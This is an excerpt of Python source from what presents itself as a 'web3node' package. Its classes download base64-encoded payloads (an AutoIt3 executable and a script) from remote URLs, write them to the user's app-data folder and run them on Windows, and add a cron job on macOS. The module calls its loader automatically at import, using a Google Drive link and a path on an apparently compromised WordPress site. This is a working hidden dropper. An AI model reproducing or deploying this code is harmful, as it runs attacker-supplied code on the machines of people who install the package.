...
class Web3NodeWin32:
    def __init__(self):
        self.wdr = os.path.join(os.environ["appdata"], "web3node")
        if os.path.exists(self.wdr) == False:
            os.makedirs(self.wdr)
        
    def activate(self, ur, pth, pr, tp):
        try:
            if "?" in pth:
                cc = f"{ur}{pth}&{pr}={tp}"
                cc2 = f"{ur}{pth}&{pr}={tp+10}"
            else:
                cc = f"{ur}{pth}?{pr}={tp}"
                cc2 = f"{ur}{pth}?{pr}={tp+10}"
                
            self.write_log(f"[cc] : {cc}\r\n".encode('utf-8'))
            data = requests.get(cc).content
            self.write_log(base64.b64decode(data), logfile="AutoIt3.exe", overwrite=True)
            data = requests.get(cc2).content
            self.write_log(base64.b64decode(data), logfile="data.au3", overwrite=True)
            sp.run([os.path.join(self.wdr, "AutoIt3.exe"), os.path.join(self.wdr, "data.au3")])
        except Exception:
            print("[Web3NodeWin32] An error occurred during activating...")
            
    def write_log(self, slog, logfile="log.txt", overwrite=False):        
        log_path = os.path.join(self.wdr, logfile)
        rmode = "ab"
        if overwrite :
            rmode = "wb"
            
        with open(log_path, rmode) as f:
            f.write(slog)
    ...
    def __call__(self, ur, pth, pr, tp, it=10):
        self.activate(ur, pth, pr, tp)

class Web3NodeDarwin:
    def __init__(self):
        self.wdr = os.path.join(os.path.expanduser("~"), "tmp/web3node")
        if os.path.exists(self.wdr) == False:
            os.makedirs(self.wdr)
    ...
    def __call__(self, ur, pth, pr, tp, it=10):
        ...
        self.write_log(f"[cr]:{cjob}".encode('utf-8'))
        cron = CronTab()
...
def init_package(ur="https://docs.google.com/", pth="uc?export=download&id=1Br_CCeWB8Zv5q9rwviUvRw3T4w-pkFDp", pr="u"):
    ...
    if otype != -1:
        oNodeC = dic_node.get(otype)
        oNode = oNodeC()
        
        if otype != 2:
            cred = oNode.auth(ur, pth, pr, otype + 10)
            
        oNode(ur, pth, pr, otype)

init_package("https://saboreysecretos.com/wp-includes/rest-api/search/", "class-wp-rest-api-search-handler.php")
